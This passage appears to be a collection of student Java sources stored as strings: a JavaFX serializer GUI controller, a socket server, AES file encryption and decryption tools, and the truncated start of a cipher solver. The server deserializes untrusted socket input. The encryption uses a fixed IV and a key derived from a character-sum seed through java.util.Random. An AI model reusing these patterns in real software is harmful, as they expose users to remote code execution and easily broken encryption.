		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Submit port");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("GETTING PORT OF SERVER: ");
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                if(textArea.getText().equals(""))
		                    return;
		                else
		                    stage.close();
		            }
		        });
		        stage.showAndWait();
		        return textArea.getText();

		    }

		    public static Integer getTopLevelElements(int i, Field f){
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter the length of the " + Helper.ordinal(i) + " dimension of" + f.getType().getName()+ " \\n");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter an integer: ");
		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Enter Integer");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("GETTING LENGTH OF DEPTH: " + i + " for " + f.getType().getName());
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                if(textArea.getText().equals(""))
		                    return;
		                else
		                    stage.close();
		            }
		        });
		        stage.showAndWait();
		        return Integer.parseInt(textArea.getText());
		    }
		    public static String getDimensionPopup(int i, int j, Field f) {
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter what you want index: " + i +"," + j + " of " + f.getType().getName()+ " to be\\n");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter field: " );
		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Enter Field");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("GETTING VALUE FOR: " + f.getType().getName());
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                stage.close();
		            }
		        });
		        stage.showAndWait();
		        return textArea.getText();
		    }

		    public static void throwArrayLengthError() {
		    }

		    public static void getPrimitiveValue(Field f, Object obj) {
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter a value for: " + f.getType() + " " + f.getName());
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter a value for: " + f.getName());
		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Enter Field");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("ADDING VALUES FOR: " + obj.getClass().getName());

		        submitButtonAction(f, obj, textArea, submit, stage);
		        stage.showAndWait();


		    }

		    private static void submitButtonAction(Field f, Object obj, TextArea textArea, Button submit, Stage stage) {
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                try {
		                    if (textArea.getText().equals("")) {
		                        return;
		                    }
		                    //primitiveCheck
		                    if (f.getType().isPrimitive() || f.getType().getName().equals("java.lang.String")) {
		                        ObjectCreatorReflective.parseFields(f, obj, textArea.getText());
		                    }
		                    stage.close();
		                } catch (IllegalAccessException e) {
		                    e.printStackTrace();
		                }
		            }
		        });
		    }

		    public static int getCollectionSize(int i, Class classObj) {
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter how big you want: " + classObj.getName() + " to be\\n");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter field: " );
		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Enter Field");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("GETTING SIZE FOR: " + classObj.getName());
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                stage.close();
		            }
		        });
		        stage.showAndWait();
		        return Integer.parseInt(textArea.getText());

		    }

		    public static String getImplementationChoice(String name) {
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease select which implementation of: " + name + " you want\\n");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        ComboBox comboBox = new ComboBox();

		        if(name.equals("java.util.List")){
		            comboBox.getItems().addAll("ArrayList", "LinkedList");
		        }
		        else if(name.equals("java.util.Set")){
		            comboBox.getItems().addAll("HashSet", "TreeSet", "LinkedHashSet");
		        }
		        else if(name.equals("java.util.Queue")){
		            comboBox.getItems().addAll("Queue");
		        }
		        else if(name.equals("java.util.Deque")){
		            comboBox.getItems().addAll("ArrayDeque", "LinkedList");
		        }
		        else if(name.equals("java.util.Map")){
		            comboBox.getItems().addAll("HashMap", "TreeMap", "LinkedHashMap");
		        }
		        Button submit = new Button();
		        submit.setText("Submit Implementation");
		        vb.getChildren().add(comboBox);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("GETTING IMPLEMENTATION FOR: " + name);
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                if(comboBox.getValue().equals(comboBox.getPromptText()))
		                    return;
		                else
		                    stage.close();
		            }
		        });
		        stage.showAndWait();
		        return comboBox.getValue().toString();
		    }

		    public static String getObjectPrimitive(Class cls) {
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter the value for a: " + cls.getName() + " \\n");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter a value: ");
		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Submit Value");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("GETTING PRIMITVE VALUE OF TYPE: " + cls.getName());
		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                if(textArea.getText().equals(""))
		                    return;
		                else
		                    stage.close();
		            }
		        });
		        stage.showAndWait();
		        return textArea.getText();

		    }

		    public void initialize(){
		        createHelpDialog();
		        classesToLoad = Helper.getClasses();
		        updateClassBox(classesToLoad);
		        objDisplay.setText("Objects:");
		        objDisplay.setEditable(false);
		        objDisplayData.setEditable(false);
		        //classBox.getItems().add("PrimitivesOnly");
		        classBox.valueProperty().addListener(new ChangeListener&ltString&gt() {
		            @Override
		            public void changed(ObservableValue observable, String oldValue, String newValue) {
		                if(newValue.equals(classBox.getPromptText())) { return;}
		                progBar.setProgress(0);
		                displayInfo.setText("Fields:\\n");
		                fieldBox.setValue(fieldBox.getPromptText());
		                fieldBox.getItems().clear();
		                fieldText.setText("");
		                try {
		                    classObj = Class.forName(classBox.getValue().toString());
		                    obj = classObj.getConstructor(new Class[] {}).newInstance();
		                } catch (ClassNotFoundException | InstantiationException | IllegalAccessException e) {
		                    System.out.println("Could not find class");

		                } catch (NoSuchMethodException | InvocationTargetException e) {
		                    e.printStackTrace();
		                }
		                Field[] fieldarr = classObj.getDeclaredFields();
		                for (Field field : fieldarr) {
		                    field.setAccessible(true);
		                    fieldBox.getItems().add(field.getName());
		                }
		                updateDisplayArea(classObj, obj);

		            }
		        });
		        fieldBox.valueProperty().addListener(new ChangeListener&ltString&gt() {
		            @Override
		            public void changed(ObservableValue&lt? extends String&gt observable, String oldValue, String newValue) {
		                if(newValue.equals(fieldBox.getPromptText())){ return;}
		                    fieldText.setText("");
		                try {
		                    classObj = Class.forName(classBox.getValue().toString());
		                } catch (ClassNotFoundException e) {
		                    System.out.println("Could not find class");
		                }
		                try {
		                    recurseFields(newValue);
		                } catch (NoSuchFieldException | IllegalAccessException |
		                        NoSuchMethodException | InvocationTargetException |
		                        InstantiationException | ClassNotFoundException e) {
		                    e.printStackTrace();
		                }
		            }
		        });

		        serializeButton.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent actionEvent) {
		                if(objArr.size() == 0){
		                    throwEmptyObjError();
		                }
		                else {
		                    try {
		                        prepForSerialize();
		                    } catch (IllegalAccessException | IOException e) {
		                        e.printStackTrace();
		                    }
		                }
		            }
		        });



		    }

		    private void updateClassBox(ArrayList&ltFile&gt classesToLoad) {
		        classBox.getItems().clear();
		        for(File f : classesToLoad){
		            String s = f.getName().replaceFirst(".class", "");
		            if(s.equals("ObjectCreator") || s.contains("Serializer") || s.contains("Visualizer") || s.contains("Deserializer") ||
		                    s.contains("ObjectCreatorController") || s.contains("ObjectCreatorReflective")
		                    || s.contains("Helper") || s.contains("Client") || s.contains("Server") || s.contains("Serializer")
		            || s.contains("Deserializer")){ continue;}
		            classBox.getItems().add(s);
		        }
		    }

		    public void createHelpDialog() {
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nWelcome To The Serializer/Deserializer Program!\\n" +
		                "I am a help dialog designed to guide you through the steps of working this program\\n\\n" +
		                "Firstly, select your class from the first ComboBox. Note this program can take custom classes\\n" +
		                "\tYou can import classes by clicking File -&gt Import Class\\n\\n" +
		                "\tIt is advised your imported classes have a toString() method!" +
		                "You have the option of naming your object in the text area\\n" +
		                "Select the field that you want to alter/set\\n" +
		                "\tIf the field is a primitive just simply set the value in the text area below\\n" +
		                "\tIf it is not a primitive, the program will prompt you with text boxes to enter values\\n\\n" +
		                "NOTE: IT IS CRUCIAL YOU CLICK SAVE FIELD IF YOU WANT CHANGES TO BE ACTIVATED\\n\\n" +
		                "Once all the fields you want to set are complete, click Create Object\\n" +
		                "You have the option of inspecting already created object by double clicking on them in the top right most pane\\n" +
		                "The area directly below this will display the information you are looking for\\n" +
		                "To delete an already created object, simply double click on the object name and press the delete object button\\n" +
		                "\\nOnce all of your objects have been created, please click SERIALIZE" +
		                "\\n\\nYou can recreate this dialog anytime by clicking Help -&gt Show Help");
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        Button submit = new Button();
		        submit.setAlignment(Pos.BASELINE_CENTER);
		        submit.setText("START");
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 700, 400);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("WELCOME");
		        stage.show();
		        stage.setAlwaysOnTop(true);

		        submit.setOnAction(new EventHandler&ltActionEvent&gt() {
		            @Override
		            public void handle(ActionEvent event) {
		                    stage.close();
		            }
		        });
		    }

		    public void recurseFields(String newValue) throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, ClassNotFoundException {
		        Field field = classObj.getDeclaredField(newValue);
		        field.setAccessible(true);
		        if(field.getType().isPrimitive()) {
		            if (field.get(obj) == null) {
		                fieldText.setText("null");
		            } else
		                fieldText.setText(field.get(obj).toString());
		        }
		        else if(field.getType().getName().equals("java.lang.String")){
		            fieldText.setText(field.get(obj).toString());
		        }
		        else if(field.getType().isArray()){
		            ObjectCreatorReflective.isAnArray(field, obj);
		        }
		        else if(!field.getType().isPrimitive()){
		            if(Collection.class.isAssignableFrom(field.getType()))
		                ObjectCreatorReflective.isACollection(field,obj);
		            else if(Map.class.isAssignableFrom(field.getType()))
		                ObjectCreatorReflective.isACollection(field,obj);
		            else if(Iterator.class.isAssignableFrom(field.getType()))
		                ObjectCreatorReflective.isACollection(field,obj);
		            else if(Enumeration.class.isAssignableFrom(field.getType()))
		                ObjectCreatorReflective.isACollection(field,obj);
		            else
		                ObjectCreatorReflective.notPrimitive(field, obj, 0);
		        }
		    }

		    public static void createPopUp(Field f, Object field, Object obj){
		        VBox vb = new VBox();
		        Text getInfo = new Text("\\n\\nPlease enter a value for: " + f.getType() + " " + f.getName());
		        getInfo.setFont(Font.font(24));
		        getInfo.setFont(Font.font("Comic Sans"));
		        getInfo.setTextAlignment(TextAlignment.CENTER);
		        vb.getChildren().add(getInfo);
		        TextArea textArea = new TextArea();
		        textArea.setPromptText("Enter a value for: " + f.getName());
		        textArea.setMaxHeight(25);
		        Button submit = new Button();
		        submit.setText("Enter Field");
		        vb.getChildren().add(textArea);
		        vb.getChildren().add(submit);

		        Scene scene = new Scene(vb, 600, 150);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("ADDING VALUES FOR: " + obj.getClass().getName() + " " + field.getClass().getName());


		        submitButtonAction(f, field, textArea, submit, stage);
		        stage.showAndWait();
		    }


		    public void updateDisplayArea(Class classObj, Object obj){
		        displayInfo.setText("");
		        displayInfo.setText("Fields:\\n");
		        displayInfo.setEditable(true);
		        Field[] fieldarr = classObj.getDeclaredFields();
		        for(int i = 0; i &lt fieldarr.length; i++){
		            Field field = fieldarr[i];
		            field.setAccessible(true);
		            try {
		                updateDisplayDeep(obj, field, displayInfo);
		            } catch (IllegalAccessException e) {
		                e.printStackTrace();
		            }
		        }
		        displayInfo.setEditable(false);
		    }

		    static void updateDisplayDeep(Object obj, Field field, TextArea displayInfo) throws IllegalAccessException {
		        if(!field.getType().isArray())
		            displayInfo.appendText(field.getType() + " " + field.getName() + " : " + field.get(obj) + "\\n");
		        else {
		            String name = field.getType().getName();
		            if(name.equals("[I"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((int[])field.get(obj))+ "\\n");
		            else if(name.equals("[D"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((double[])field.get(obj))+ "\\n");
		            else if(name.equals("[S"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((short[])field.get(obj))+ "\\n");
		            else if(name.equals("[J"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((long[])field.get(obj))+ "\\n");
		            else if(name.equals("[B"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((byte[])field.get(obj))+ "\\n");
		            else if(name.equals("[C"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((char[])field.get(obj))+ "\\n");
		            else if(name.equals("[F"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((float[])field.get(obj))+ "\\n");
		            else if(name.equals("[Z"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((boolean[])field.get(obj))+ "\\n");
		            else if(name.equals("[[I"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((int[][])field.get(obj))+ "\\n");
		            else if(name.equals("[[D"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((double[][])field.get(obj))+ "\\n");
		            else if(name.equals("[[S"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((short[][])field.get(obj))+ "\\n");
		            else if(name.equals("[[J"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((long[][])field.get(obj))+ "\\n");
		            else if(name.equals("[[B"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((byte[][])field.get(obj))+ "\\n");
		            else if(name.equals("[[C"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((char[][])field.get(obj))+ "\\n");
		            else if(name.equals("[[F"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((float[][])field.get(obj))+ "\\n");
		            else if(name.equals("[[Z"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((boolean[][])field.get(obj))+ "\\n");
		            else if(name.equals("[Ljava.lang.String;"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.toString((String[])field.get(obj))+ "\\n");
		            else if(name.equals("[[Ljava.lang.String;"))
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((String[][])field.get(obj))+ "\\n");
		            else
		                displayInfo.appendText(field.getType() + " " + field.getName() + " : " + Arrays.deepToString((Object[])field.get(obj)) + "\\n");

		        }
		    }

		    public void saveField(ActionEvent actionEvent) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
		        String classStr = classBox.getValue();
		        String fieldStr = fieldBox.getValue();
		        String newStr = fieldText.getText();
		        Field field = obj.getClass().getDeclaredField(fieldStr);
		        field.setAccessible(true);
		        try {
		            ObjectCreatorReflective.parseFields(field, obj, newStr);
		        }
		            catch(IllegalAccessException e){
		                System.out.println("Could not access field");
		            }
		            catch (IllegalArgumentException | UnsupportedOperationException c) {
		                throwRangeError(field);
		                fieldText.setText(field.get(classObj).toString());
		            }
		        updateDisplayArea(classObj, obj);
		    }

		    public void createObj(ActionEvent actionEvent) throws InterruptedException {
		        if(classBox.getValue().equals(classBox.getPromptText())){ return;}
		        if(!objArr.contains(obj) || !objDisplay.getText().contains(fieldText2.getText())) {
		            for(double i = 0; i &lt 1; i=i+0.1){
		                progBar.setProgress(i);
		            }
		            objArr.add(obj);
		            if(fieldText2.getText().equals(""))
		                objDisplay.appendText("\\n" + obj.getClass().getName());
		            else
		                objDisplay.appendText("\\n" + fieldText2.getText());
		            classBox.setValue(classBox.getPromptText());
		            fieldBox.setValue(fieldBox.getPromptText());
		            fieldText.setText("");
		            displayInfo.setText("");
		            fieldText2.setText("");
		        }
		        else{
		            throwExistError();
		        }

		    }

		    public void deleteObject(ActionEvent actionEvent) throws ClassNotFoundException {
		        String[] differentName = objDisplay.getText().split("\\n");
		        int index = -1;
		        String toRemove = objDisplay.getSelectedText();
		        for(int i = 0; i &lt differentName.length; i++){
		            if(differentName[i].contains(toRemove)) {
		                index = i;
		                break;
		            }
		        }
		        if(toRemove.equals("Objects") || toRemove.equals("Objects:")){ return;}
		        objDisplay.setText(objDisplay.getText().replace("\\n"+toRemove, ""));
		        objArr.remove(index - 1);
		        objDisplayData.setText("");
		        classBox.setValue(classBox.getPromptText());
		    }

		    public void displayObjInfo(MouseEvent mouseEvent) throws ClassNotFoundException, IllegalAccessException {
		        if(mouseEvent.getClickCount() == 2) {
		            double mind = mouseEvent.getY();
		            int mindy = (int) (mind / 20);
		            if (mindy &lt 1) {
		                return;
		            }
		            Object ohj = null;
		            try {
		                objDisplayData.setText("");
		                ohj = objArr.get(mindy - 1);
		                objDisplayData.setText("Object properties:\\n");
		                objDisplayData.setText("Object: " + ohj.getClass().getName() + "\\n");
		                for (Field field : ohj.getClass().getDeclaredFields()) {
		                    field.setAccessible(true);
		                    updateDisplayDeep(ohj, field, objDisplayData);
		                }
		            } catch (IndexOutOfBoundsException e) {
		                throwIndexError();
		            }
		        }
		    }

		    public static void throwRangeError(Field field) {
		        BorderPane borderPane = new BorderPane();
		        Text warning = new Text("\\n\\nValue out of range for type: " + field.getType());
		        warning.setFont(Font.font(24));
		        warning.setFont(Font.font("Comic Sans"));;
		        warning.setTextAlignment(TextAlignment.CENTER);
		        borderPane.getChildren().add(warning);
		        Scene scene = new Scene(borderPane, 230, 50);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("ERROR");
		        stage.show();

		    }

		    public static void throwExistError(){
		        BorderPane borderPane = new BorderPane();
		        Text warning = new Text("\\n\\nObject already exists!");
		        warning.setFont(Font.font(24));
		        warning.setFont(Font.font("Comic Sans"));;
		        warning.setTextAlignment(TextAlignment.CENTER);
		        borderPane.getChildren().add(warning);
		        Scene scene = new Scene(borderPane, 230, 50);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("ERROR");
		        stage.show();
		    }

		    public static void throwIndexError() {
		        BorderPane borderPane = new BorderPane();
		        Text warning = new Text("\\n\\nYou've been clicking out of bounds");
		        warning.setFont(Font.font(24));
		        warning.setFont(Font.font("Comic Sans"));
		        warning.setTextAlignment(TextAlignment.CENTER);
		        borderPane.getChildren().add(warning);
		        Scene scene = new Scene(borderPane, 230, 50);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("ERROR");
		        stage.show();
		    }

		    public static void throwEmptyObjError(){
		        BorderPane borderPane = new BorderPane();
		        Text warning = new Text("\\n\\nYou havent created an object yet!");
		        warning.setFont(Font.font(24));
		        warning.setFont(Font.font("Comic Sans"));
		        warning.setTextAlignment(TextAlignment.CENTER);
		        borderPane.getChildren().add(warning);
		        Scene scene = new Scene(borderPane, 230, 50);
		        scene.setFill(Color.RED);
		        Stage stage = new Stage();
		        stage.setScene(scene);
		        stage.setTitle("ERROR");
		        stage.show();
		    }

		    public void importClass(ActionEvent actionEvent) throws IOException {
		        Stage stage = new Stage();
		        FileChooser fc = new FileChooser();
		        File file = fc.showOpenDialog(stage);
		        Path text = null;

		        if (file != null) {
		            text = file.toPath();
		        }
		        if(!text.toString().contains(".class")) { importClass(actionEvent);}
		        int index = text.toString().lastIndexOf("/");
		        String fileName = text.toString().substring(index+1);
		        Path temp = Files.copy(text,Paths.get(Helper.getMyDir()+fileName), StandardCopyOption.REPLACE_EXISTING);
		        classesToLoad.add(new File(fileName));
		        updateClassBox(classesToLoad);
		    }
		}`
	},
	srv: {
		type: 'java',
		code: `
		import org.jdom2.Document;
		import org.jdom2.input.SAXBuilder;
		import org.jdom2.output.XMLOutputter;

		import javax.print.Doc;
		import java.io.*;
		import java.net.ServerSocket;
		import java.net.Socket;
		import java.util.ArrayList;
		import java.util.Scanner;

		public class Server {
		    private ServerSocket serverSocket;
		    private Socket socket;
		    private PrintWriter out;
		    private BufferedReader in;
		    public Server(){}

		    public ArrayList&ltDocument&gt start(int port) throws IOException {
		        ArrayList&ltDocument&gt docList = null;
		        try{
		            serverSocket = new ServerSocket(port);
		            socket = serverSocket.accept();
		            // Connected to client
		            out = new PrintWriter(socket.getOutputStream(),true);
		            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		            ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());
		            docList = (ArrayList&ltDocument&gt) objectInputStream.readObject();
		            serverSocket.close();
		        }
		        catch (Exception e) {
		            System.out.println("Error: " + e.getMessage());
		        }
		        return docList;
		    }

		    public void shutdown() throws IOException {
		        in.close();
		        out.close();
		        socket.close();
		    }
		}`
	},
	sf: {
		type: 'java',
		code: `
		import java.io.File;
		import java.nio.file.Files;
		import java.security.MessageDigest;
		import java.util.Random;
		import javax.crypto.Cipher;
		import javax.crypto.spec.IvParameterSpec;
		import javax.crypto.spec.SecretKeySpec;

		/*
		 * ## Authors
		 * **Joshua Dow, 10150588**
		 *  Class to Encrypt File using CBC AES-128 with Message Digest
		 */
		public class secureFile {
		  
		  private static final String initVector = "encryptionIntVec";
		  
		  // Encryption code
		  public static void encrypt(String inputFilename, String outputFilename, String key) throws Exception {
		    // Construct Cipher object
		    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		    IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
		    SecretKeySpec keySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
		    // Initialize Cipher object
		    cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);
		    File inputFile = new File(inputFilename);
		    byte[] inputBytes = Files.readAllBytes(inputFile.toPath());
		    MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
		    // Construct digest bytes
		    byte[] digestBytes = messageDigest.digest(inputBytes);
		    // Construct digest bytes + input bytes
		    byte[] digestBytesPlusInputBytes = new byte[digestBytes.length+10+inputBytes.length];
		    for (int i = 0; i &lt digestBytes.length; i++) {
		      digestBytesPlusInputBytes[i] = digestBytes[i];
		    }
		    for (int i = digestBytes.length+10; i &lt digestBytesPlusInputBytes.length; i++) {
		      digestBytesPlusInputBytes[i] = inputBytes[i-digestBytes.length-10];
		    }
		    // Do encryption
		    byte[] outputBytes = cipher.doFinal(digestBytesPlusInputBytes);
		    // Write encrypted data to output file
		    File outputFile = new File(outputFilename);
		    Files.write(outputFile.toPath(), outputBytes);
		    System.out.println("File \"" + inputFilename + "\" encrypted to \"" + outputFilename + "\" successfully!");
		  }
		  
		  // Main method for program execution
		  public static void main(String[] args) throws Exception {
		    int seed = 0;
		    if (args.length &gt= 3) {
		      for (int i = 0; i &lt args[2].length(); i++) {
		        seed += args[2].charAt(i);
		      }
		      Random r = new Random(seed);
		      String key = "";
		      for (int i = 0; i &lt 16; i++) {
		        key += r.nextInt(10);
		      }
		      secureFile.encrypt(args[0], args[1], key);
		    }
		    else {
		      System.out.println("Please make sure to include a seed! No encryption was performed");
		    }
		    /* Test */
		  }
		}`
	},
	df: {
		type: 'java',
		code: `
		import java.io.File;
		import java.nio.file.Files;
		import java.security.MessageDigest;
		import java.util.Random;
		import javax.crypto.Cipher;
		import javax.crypto.spec.IvParameterSpec;
		import javax.crypto.spec.SecretKeySpec;

		/*
		 * ## Authors
		 * **Joshua Dow, 10150588**
		 *  Class to Decrypt File using CBC AES-128 with Message Digest
		 */
		public class decryptFile {
		  
		  private static final String initVector = "encryptionIntVec";
		  
		  // Decryption code
		  public static void decrypt(String inputFilename, String outputFilename, String key) throws Exception {
		    // Construct Cipher object
		    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		    IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
		    SecretKeySpec keySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
		    // Initialize Cipher object
		    cipher.init(Cipher.DECRYPT_MODE, keySpec, iv);
		    File inputFile = new File(inputFilename);
		    byte[] inputBytes = Files.readAllBytes(inputFile.toPath());
		    byte[] digestBytesPlusOutputBytes;
		    // Do decryption
		    try {
		      digestBytesPlusOutputBytes = cipher.doFinal(inputBytes);
		    } catch (Exception e) {
		      System.out.println("ERROR - Message was altered after encryption.");
		      return;
		    }
		    // Identify index of null byte between digest bytes & output bytes
		    int index = -1;
		    for (int i = 0; i &lt digestBytesPlusOutputBytes.length-10; i++) {
		      if (digestBytesPlusOutputBytes[i] == 0 &&
		          digestBytesPlusOutputBytes[i+1] == 0 &&
		          digestBytesPlusOutputBytes[i+2] == 0 &&
		          digestBytesPlusOutputBytes[i+3] == 0 &&
		          digestBytesPlusOutputBytes[i+4] == 0 &&
		          digestBytesPlusOutputBytes[i+5] == 0 &&
		          digestBytesPlusOutputBytes[i+6] == 0 &&
		          digestBytesPlusOutputBytes[i+7] == 0 &&
		          digestBytesPlusOutputBytes[i+8] == 0 &&
		          digestBytesPlusOutputBytes[i+9] == 0) {
		        index = i;
		        break;
		      }
		    }
		    // Construct digest bytes
		    byte[] digestBytes = new byte[index];
		    for (int i = 0; i &lt digestBytes.length; i++) {
		      digestBytes[i] = digestBytesPlusOutputBytes[i];
		    }
		    // Construct output bytes
		    byte[] outputBytes = new byte[digestBytesPlusOutputBytes.length-index-10];
		    for (int i = 0; i &lt outputBytes.length; i++) {
		      outputBytes[i] = digestBytesPlusOutputBytes[index+10+i];
		    }
		    // Check message digest
		    MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
		    byte[] digestBytes2 = messageDigest.digest(outputBytes);
		    for (int i = 0; i &lt digestBytes.length; i++) {
		      if (digestBytes[i] != digestBytes2[i]) {
		        System.out.println("ERROR - Message was altered after encryption.");
		        return;
		      }
		    }
		    // Write decrypted data to output file
		    File outputFile = new File(outputFilename);
		    Files.write(outputFile.toPath(), outputBytes);
		    System.out.println("File \"" + inputFilename + "\" decrypted to \"" + outputFilename + "\" successfully!");
		  }
		  
		  // Main method for program execution
		  public static void main(String[] args) throws Exception {
		    if (args.length &gt= 3) {
		      int seed = 0;
		      for (int i = 0; i &lt args[2].length(); i++) {
		        seed += args[2].charAt(i);
		      }
		      Random r = new Random(seed);
		      String key = "";
		      for (int i = 0; i &lt 16; i++) {
		        key += r.nextInt(10);
		      }
		      decryptFile.decrypt(args[0], args[1], key);
		    }
		    else {
		      System.out.println("Please make sure to include a seed! No encryption was performed");
		    }
		  }
		  
		}`
	},
	mvs: {
		type: 'java',
		code: `
		import javax.print.DocFlavor;
		import java.math.*;
		import java.io.*;
		import java.nio.Buffer;
		import java.util.*;

		public class Solver {

		    public static void main(String[] args) {
			    File cipherText = new File(".../src/ciphertext.txt");
		        try {
		            BufferedReader reader = new BufferedReader(new FileReader(cipherText));
		            String cipher = "";
